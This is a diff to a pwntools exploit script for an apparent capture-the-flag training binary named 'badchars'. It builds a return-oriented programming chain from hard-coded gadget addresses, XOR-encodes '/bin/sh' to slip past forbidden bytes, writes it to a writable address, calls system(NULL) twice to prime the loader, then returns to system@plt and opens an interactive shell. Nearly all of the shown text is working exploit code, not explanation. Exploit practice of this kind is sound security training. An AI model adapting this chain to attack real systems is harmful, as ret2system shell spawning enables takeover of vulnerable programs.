@@ -54,7 +54,8 @@ io = start()
 #    $ ropper -f badchars --type=rop  -b='6269632f20666e73'
 #
 # The plan is to write a ROP chain that does the following:
-#   - Write "/bin/cat flag.txt" (XOR key) to a fixed address
+#   - Write "/bin/sh" (XOR key) to a fixed address (there is not
+#     enough ROP space to write "/bin/cat flag.txt")
 #   - Load the fixed address into rdi 
 #   - Return to system@plt
 #
@@ -153,14 +154,29 @@ def write_string(chain, addr, s, badchars):
     # Extend the ROP chain to decode the string in place.
     return xor_memory(chain, addr, len(es), bytekey)
 
+
+# Before starting with our plan, we trigger two system(NULL), so
+# that the dynamic loader is triggered before we start corrupting
+# memory too much. Calling system(NULL) just once does not work,
+# and I don't know why ... it works if we call it 2,3,4 times
+# or more.
+for i in range(2):
+    # Append the address of a 'pop rdi; ret' gadget,
+    # and the address of a null 64-bit word (somewhere in a read-only
+    # section).
+    vector += p64(0x400b39)
+    vector += p64(0x600008)
+
+    # Return to system@plt (rabin2 -i ./badchars)
+    vector += p64(0x4006f0)
+
 # We will write somewhere in the middle of the range [0x601000,0x602000),
 # which is writable, as shown by vmmap. Writing to the beginning of
 # this range also works if we only write 8 bytes (writing more than
 # that will crash the program before we can get to execute the
 # desired command... remember that we are corrupting memory, so who
 # knows why we get a crash).
-dest_addr = 0x601f00
-
+dest_addr = 0x601e00
 vector = write_string(vector, dest_addr, '/bin/sh', 'bic/ fns')
 
 # Append the address of a 'pop rdi; ret' gadget,
@@ -170,6 +186,9 @@ vector += p64(dest_addr)
 
 # Return to system@plt (rabin2 -i ./badchars)
 vector += p64(0x4006f0)
+
+# Our ROP chain must fit in the malloc()ed buffer.
+assert(len(vector) <= 512)
 
 io.sendline(vector)
 io.interactive()
